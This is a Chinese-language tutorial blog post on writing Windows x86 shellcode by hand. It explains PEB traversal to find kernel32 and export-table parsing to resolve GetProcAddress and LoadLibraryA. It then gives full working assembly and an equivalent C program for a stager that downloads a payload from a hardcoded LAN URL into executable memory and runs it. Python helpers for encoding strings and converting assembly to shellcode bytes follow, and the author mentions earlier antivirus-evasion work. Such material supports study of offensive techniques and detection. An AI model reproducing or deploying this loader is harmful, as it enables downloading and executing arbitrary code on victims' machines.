Windows系统中编写Shellcode
=====================

最近看了一篇文章，是关于windows下shellcode编写，写的很详细

原文地址：<https://blog.csdn.net/liujiayu2/article/details/78327855>

之前写过一篇手搓免杀（就是简单的在现成的shellcode下动手脚），想实现一个完全是自己编写的shellcode

上面的文章别的点都写的很清楚，只有PE格式那段稍微有点难理解（当然可能是我理解能力不行），准备把PE和找kernel32基址用自己的方法再表述一下，后面就开始写shellcode

0x01 查找kernel32基址
-----------------

这个原文里面有写过，现在从内存里面逐步找一遍，整个过程会清晰很多，因为kernel32.dll的基址在每台机器都是不固定的，所以需要想办法获取

首先还是要用到PEB，关于PEB的结构可以去看修改PEB伪装进程那篇文章，这里就不贴出来了

上次没用到的结构贴一下

### PPEB\_LDR\_DATA Ldr

```c++
typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;         //需要用到这个
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

### LIST\_ENTRY InMemoryOrderModuleList

```c++
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
```

这是一个双向链表，Flink指向上一个LDR\_DATA\_TABLE\_ENTRY

Blink指向下一个LDR\_DATA\_TABLE\_ENTRY

### LDR\_DATA\_TABLE\_ENTRY

```c++
typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;              //这里就是dll的基址，对于InMemoryOrderLinks位置偏移是0x10，因为InMemoryOrderLinks里面还有两个指针所以0x4*0x4=0x10
    PVOID Reserved3[2];
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
#pragma warning(push)
#pragma warning(disable: 4201) // we'll always use the Microsoft compiler
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    } DUMMYUNIONNAME;
#pragma warning(pop)
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

过程：PEB-&gt;Ldr-&gt;InMemoryOrderModuleList-&gt;Blink-&gt;Blink-&gt;Blink+0x10=kernel32.dll基址

首先在PEB中找到Ldr，前面四个BTYTE和后面两个指针加起来一个0xC个字节，后面就是Ldr

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d3270bd26404f5d24b754297d83f0e7df478aebd.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d3270bd26404f5d24b754297d83f0e7df478aebd.png)

找到Ldr后8个BYTE+3个指针=0x8+0xc=0x14字节

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5335853230abb614bb4c0feb9b3db131dfc40256.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5335853230abb614bb4c0feb9b3db131dfc40256.png)

打开第一个就是Blink

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4c67ea1a660b74e71e2dea31c624deb142c5f6e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4c67ea1a660b74e71e2dea31c624deb142c5f6e4.png)

因为现在是第一个，所以Flink指向的没有上一个

下面继续跟着这个地址走到第二个

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a4d2abf07d7e65ea38c5a01894a177842467cca9.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a4d2abf07d7e65ea38c5a01894a177842467cca9.png)

第二个就可以明显的看到Blink指向下一个，Flink指向上一个，也就是上一个的地址

这里的DllBase是ntdll.dll的，下一个才是kernel32.dll所以还需要找下一个

继续输入Flink里面的地址找到下一个LDR\_DATA\_TABLE\_ENTRY结构

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-b47156a16edeb9fb8c98c3c1a6355e6c2252957=)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-b47156a16edeb9fb8c98c3c1a6355e6c22529578.png)

框中就是kernel32.dll的基址

0x02 PE格式
---------

按照文章中的描述重要的是导出表，当时我以为是执行shellcode程序的导出表，后来发现普通的可执行程序是没有导出表的，一般都是在dll里面

所以文章中要找的是kernel32.dll里面的导出表

还有那些结构不能直接在PE里面去看，因为很多都是偏移，需要在内存中看才能看的清楚

不过首先要知道这个结构在哪，这个可以直接在PE里面看，为了方便看下面把经过的结构都写出来

后面的数字都是偏移，把运算需要用到的写出来了

### IMAGE\_DOS\_HEADER

```c++
typedef struct _IMAGE_DOS_HEADER {      
    WORD   e_magic;
    WORD   e_cblp;
    WORD   e_cp;
    WORD   e_crlc;
    WORD   e_cparhdr;
    WORD   e_minalloc;
    WORD   e_maxalloc;
    WORD   e_ss;
    WORD   e_sp;
    WORD   e_csum;
    WORD   e_ip;
    WORD   e_cs;
    WORD   e_lfarlc;
    WORD   e_ovno;
    WORD   e_res[4];
    WORD   e_oemid;
    WORD   e_oeminfo;
    WORD   e_res2[10];
    LONG   e_lfanew;        //0x3c
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
```

这个结构只需要关注最后一个元素，这个元素指向IMAGE\_NT\_HEADERS结构开始的地址

### IMAGE\_NT\_HEADERS

```c++
typedef struct _IMAGE_NT_HEADERS {
  DWORD                   Signature;        //0x0
  IMAGE_FILE_HEADER       FileHeader;       //0x4
  IMAGE_OPTIONAL_HEADER32 OptionalHeader;   //0x18
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

### IMAGE\_OPTIONAL\_HEADER

```c++
typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
  DWORD                ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  DWORD                SizeOfStackReserve;
  DWORD                SizeOfStackCommit;
  DWORD                SizeOfHeapReserve;
  DWORD                SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;         
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //0x60  需要用到这个结构里面的第一个元素IMAGE_DATA_DIRECTORY Export
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

### IMAGE\_DATA\_DIRECTORY

```c++
typedef struct _IMAGE_DATA_DIRECTORY {
  DWORD VirtualAddress;         //因为是第一个元素里面第一个参数所以和结构的起始位置一样
  DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

### IMAGE\_EXPORT\_DIRECTORY

```c++
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     //0x1c
    DWORD   AddressOfNames;         //0x20
    DWORD   AddressOfNameOrdinals;  //0x24
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

这里最后三个都是需要用到的

AddressOfFunctions 存放着函数地址的偏移量，kernel32地址+偏移量就可以得到函数地址

AddressOfNames 存放着函数名的偏移量，kernel32地址+偏移量就可以得到函数名

AddressOfNameOrdinals 存放着函数的序号，不一定是从1开始的，知道序号之后就可以去AddressOfFunctions找地址，这是一个数组，后面会演示

下面写一下取地址的过程

从IMAGE\_DOS\_HEADER(e\_lfanew)取出IMAGE\_NT\_HEADERS偏移地址，IMAGE\_NT\_HEADERS+0x18+0x60到IMAGE\_DATA\_DIRECTORY结构获取IMAGE\_EXPORT\_DIRECTORY偏移地址，kernel32地址+IMAGE\_EXPORT\_DIRECTORY偏移地址到IMAGE\_EXPORT\_DIRECTORY，接下来就是获取0x1c，0x20，0x24三个偏移地址

### 下面在x32dbg里面逐步演示

首先在内存区输入kernel32.dll的地址，这里kerne32的基址是76B00000，每台机器都是不一样的

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-516b788331be6ebd533a7df138ff7468311207fd.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-516b788331be6ebd533a7df138ff7468311207fd.png)

这里和PE文件结构是一样的

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7665549ec479593b9583a722684d5f612554905a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-7665549ec479593b9583a722684d5f612554905a.png)

下面标记一下需要用到的

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-06e78c2ddff817ad22304ee77c42e1e828a22f6c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-06e78c2ddff817ad22304ee77c42e1e828a22f6c.png)

第一个是IMAGE\_DOS\_HEADER(e\_lfanew)，在

kernel32+000000F8 = 76B000F8

第二个就是IMAGE\_NT\_HEADERS的起始地址也就是上面的76B000F8

第三个就是找到IMAGE\_EXPORT\_DIRECTORY结构的偏移

76B00000+00092C70=76B92C70就是IMAGE\_EXPORT\_DIRECTORY结构的地址

现在跳过去看一下

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a7c40438e52ae6a9fe352e09ff66d532c17e933d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a7c40438e52ae6a9fe352e09ff66d532c17e933d.png)

这里的红框对应

AddressOfFunctions AddressOfNames AddressOfNameOrdinals

偏移地址

另外两个暂时不用看，先看一下AddressOfNames

上面说了里面存放着函数名的偏移76B00000+000945B4=76B945B4

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-566b29b7031659bc4c54ab73ea4451190bcb6023.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-566b29b7031659bc4c54ab73ea4451190bcb6023.png)

这里每四个字节都是一个偏移地址，直接拿第一个看看

76B00000+00096BCA = 76B96BCA

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ca323c27276557f78e1daaa8774c35390b7f0810.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ca323c27276557f78e1daaa8774c35390b7f0810.png)

可以看到是一个函数字符串的起始地址

现在这些都了解的差不多了

再去看找GetProcAddress函数地址的那段汇编应该就会好懂

```php
;这里的ebx就是kernel32的起始地址，完整的可以看原文
mov edx,[ebx+0x3c]          ;获取IMAGE_NT_HEADERS的起始地址，这里获取的是偏移
add edx,ebx                 ;这边需要加上kernel32的地址，也就是上面说的76B00000+000000F8
mov edx, [edx+0x78]         ;获取IMAGE_EXPORT_DIRECTORY的偏移地址
add edx, ebx                ;同样加上kernel32的地址，就是76B00000+00092C70
mov esi, [edx+0x20]         ;获取AddressOfNames偏移地址
add esi, ebx                ;和上面两个一样
xor ecx,ecx                 ;ecx清零
Get_Function:
inc ecx                     ;ecx加一，计数的后面要用
lodsd                       ;lodsd就是把当前esi的值放到eax中，然后加4，这里就是把字符串偏移地址放入eax中，然后先跳到下一个字符串偏移地址
add eax,ebx                 ;获取字符串
cmp dword ptr [eax], 0x50746547 ;对比字符串前四个字符是否是GetP
jnz Get_Function                ;如果不是就返回重来
cmp dword ptr [eax+4], 0x41636f72   ;对比字符串5-8个字符是否是rocA
jnz Get_Function                ;如果不是就返回重来,这里两次就够了，因为前八个字符是GetProcA的只有GetProcAddress这一个函数
```

这段程序全部执行结束后ecx的大小就是函数在第几个位置，可以去AddressOfNameOrdinals找到对应的序号最后从AddressOfFunctions获取函数地址

先去AddressOfNameOrdinals看一下

AddressOfNameOrdinals 76B00000+00095ED0 = 76B95ED0

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-cd92f2335a82cd7aff35a5961b59ed8c4edf4323.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-cd92f2335a82cd7aff35a5961b59ed8c4edf4323.png)

就像上面说的这里的序号不是从1开始的，并且一个序号占两个字节，通过前面的ecx可以找到GetProcAddress对应的序号，这里ecx是2B2

具体方法就是76B95ED0+ecx\*2因为序号是两个字节所以要乘二，然后加上AddressOfNameOrdinals的起始地址也就是76B95ED0，最后从里面取出来-1就是GetProcAddress的序号，-1是因为数组是0开始的，这里运算完的值还是放回ecx里面的，ecx=2B3

最后去AddressOfFunctions找函数地址

76B00000 + 00092C98 = 76B92C98

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a9abdbfa52e6ec623a3c0ff0b493d534ba983c38.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a9abdbfa52e6ec623a3c0ff0b493d534ba983c38.png)

这里面都是函数的偏移地址

并且这些地址都是四位的，所以需要76B92C98+ECX\*4=76B93764

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-22587e45a0dfefe9f86a125dce7b37e454ac48d6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-22587e45a0dfefe9f86a125dce7b37e454ac48d6.png)

取出里面的值，可以看到偏移地址为0001F550

76B00000 + 0001F550 =76B1F550这个就是GetProcAddress的函数地址

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-cb55c934bb5a62d1cec1c835f80c4a6ffbbf0760.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-cb55c934bb5a62d1cec1c835f80c4a6ffbbf0760.png)

获取GetProcAddress地址，后续的函数直接使用GetProcAddress找地址就行

0x03 shellcode编写
----------------

1. 找到kernel32.dll基址
2. 通过导出表找到GetProcAddress函数地址
3. 通过GetProcAddress获取LoadLibraryA函数地址
4. 有了这两个函数地址，可以获取任何dll里面的函数
5. 最后就是找函数地址，然后调用函数

下面是我写的一个简单的汇编

```c++
int __declspec(naked) main()
{
    __asm {
        xor ecx,ecx
        mov eax,fs:[ecx+0x30]
        mov eax, [eax+0xC]
        mov esi, [eax+0x14]
        lodsd
        xchg eax, esi
        lodsd
        mov ebx,[eax+0x10]
        mov edx,[ebx+0x3c]
        add edx,ebx
        mov edx, [edx+0x78]
        add edx, ebx
        mov esi, [edx+0x20]
        add esi, ebx
        xor ecx,ecx

        Get_Function:
        inc ecx
        lodsd
        add eax,ebx
        cmp dword ptr [eax], 0x50746547
        jnz Get_Function
        cmp dword ptr [eax+4], 0x41636f72
        jnz Get_Function

        mov esi, [edx+0x24]
        add esi, ebx
        mov cx, [esi + ecx * 2]
        dec ecx
        mov esi, [edx+0x1c]
        add esi, ebx
        mov edx, [esi + ecx * 4]
        add edx, ebx

        //到这里就是获取GetProcAddress函数地址

        xor ecx, ecx
        push ebx            //ebx是kernel32.dll的基址，push到栈里面后面可以用
        push edx            //edx是GetProcAddress函数地址
        push ecx            //这里就相当于push 0,但是这样写硬编码会少很多，push 0 是为了截取字符串，一个指针里面的值是否到头就是用\x00判断的
        push 0x41797261     //aryA
        push 0x7262694c     //Libr
        push 0x64616f4c     //Load，这三个是push字符串，LoadLibraryA，根据栈的规则需要这样写，为了方便还写了一i个小脚本，后面贴出来
        push esp            //push字符串函数指针
        push ebx            //push kernel32.dll基址
        call edx            //调用GetProcAddress函数

        mov esi, eax
        add esp, 0xc
        push 0x6c6c64
        push 0x2e74656e
        push 0x696e6977     
        push esp
        call esi

//这一段是获取wininet.dll的基址，后面的函数都是在这个dll里面

        add esp, 0xc                    //降低栈顶
        mov edx, dword ptr[esp+4]       //获取wininet.dll函数地址
        push 0x00000041
        push 0x6e65704f
        push 0x74656e72
        push 0x65746e49                 //push 字符串InternetOpenA
        mov  edi, eax                   //eax是wininet.dll的基址
        push esp                        //InternetOpenA
        push eax                        //wininet.dll基址
        call edx                        //调用GetProcAddress获取InternetOpenA地址
        add esp, 0x14           //清除堆栈
        push eax                //保存InternetOpen函数地址

//后面的几个函数基本都是一个思路

        xor edx, edx
        push edx
        mov [esp], 0x20000000
        mov edx, dword ptr[esp + 8]
        push 0x416c7255
        push 0x6e65704f
        push 0x74656e72
        push 0x65746e49
        push esp
        push edi
        call edx
        add esp, 0x14           //清除堆栈
        push eax                //保存InternetOpenUrlA

        xor edx, edx
        push edx
        mov [esp], 0x20000000
        mov edx, dword ptr[esp + 0xc]
        push 0x636f6c6c
        push 0x416c6175
        push 0x74726956
        push esp
        push ebx
        call edx
        add esp, 0x10   //清除堆栈
        push eax        //保存VirtualAlloc

        xor edx, edx
        push edx
        mov edx, dword ptr[esp + 0x10]
        push 0x656c6946
        push 0x64616552
        push 0x74656e72
        push 0x65746e49
        push esp
        push edi
        call edx
        add esp, 0x14   //清除堆栈  
        push eax        //保存InternetReadFile

        //到这里都是获取函数地址，后面就是调用函数

        mov edx, dword ptr [esp+0xc]
        push 0
        push 0
        push 0
        push 1
        push 0
        call edx

        mov edx, dword ptr[esp + 0x8]
        mov ecx,esp
        mov esp,ebp
        add esp, 0x20
        push 0x0069764b
        push 0x322f3832
        push 0x312e3935
        push 0x312e3836
        push 0x312e3239
        push 0x312f2f3a
        push 0x70747468
        mov esp, ecx
        push 0
        push 0x04000000
        push 0
        push 0
        mov ecx, ebp
        add ecx, 4
        push ecx
        push eax
        call edx
        mov edi, eax

        mov edx, dword ptr[esp + 0x4]
        push 0x40
        push 0x1000
        push 0x400000
        push 0
        call edx

        mov esi, eax
        mov edx, dword ptr [esp]
        push ebp
        push 0x400000
        push eax
        push edi
        call edx
        jmp esi
    }
}
```

这段汇编的功能和下面这个代码实现的效果是一样的

```c++
#include<Windows.h>
#include<wininet.h>
#pragma comment (lib, "wininet.lib")

int main() {
    HINTERNET Session = InternetOpenA("aa", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET Http = InternetOpenUrlA(Session, "http://192.168.159.128/2Kvi", NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, NULL);
    LPVOID a = VirtualAlloc(NULL, 0x400000, MEM_COMMIT,     PAGE_EXECUTE_READWRITE);
    DWORD dwRealWord;
    BOOL response = InternetReadFile(Http, a, 0x400000, &dwRealWord);
    ((void(*)())a)();
    return 0;
    }
```

整体的思路就是先把函数都取出来push到栈里，然后再一个个调用

0x04 踩坑
-------

这次写shellcode的时候踩了两个坑

首先是push url那个地方，本来把url放在esp的上面发现读不到，最后只能把esp先降到比ebp低然后放到ebp下面才可以读到，当然应该有好的方法就像CS那样直接把url放在payload的某一块然后去读，具体该怎么操作还是没有想到，或许以后看一下CS的shellcode会有启发

第二个就是CALL，在win10下面CALL 寄存器之后那个寄存器会置零，然后再把置零的寄存器push进去刚好起一个截取字符串的作用，但是在win7下CALL了之后不会置零，最后选择了xor edx,edx置零，这段汇编用到的函数地址都是放在edx里面的所以置零的是edx

0x05 脚本
-------

上面说到的push字符串的时候那个字符串放进去别扭，需要先转换成十六进制然后再四个四个放进去，写个脚本自动把字符串换成push的格式

```python
import re

a = "VirtualAlloc"
func = a.encode().hex()

list = re.findall("..", func)
while(len(list)%4 !=0):
    list.append("00")
list_ = list[::-1]
n = 0
print("push 0x", end="")
for i in  list_:
    if n == 4:
        print("\npush 0x", end="")
        n = 0
    print(i, end="")
    n = n + 1
```

还有一个就是最后汇编转shellcode的问题，可以在x32dbg中取出所有手搓的汇编，写入asm.txt，因为x32dbg里面的汇编语句复制出来都是有格式的，所以只需要字符串简单的处理一下就好，可以把汇编语言转换为shellcode就不需要手动写了

```python
import re
a = open("asm.txt", "r")
asm_ = a.read().split("\n")
asm_command = ""
for i in asm_:
    asm_command += i.split("|")[1].replace(" ","").replace(":", "")
asm_command_list = re.findall("..", asm_command)
print("\\x".join(asm_command_list))
```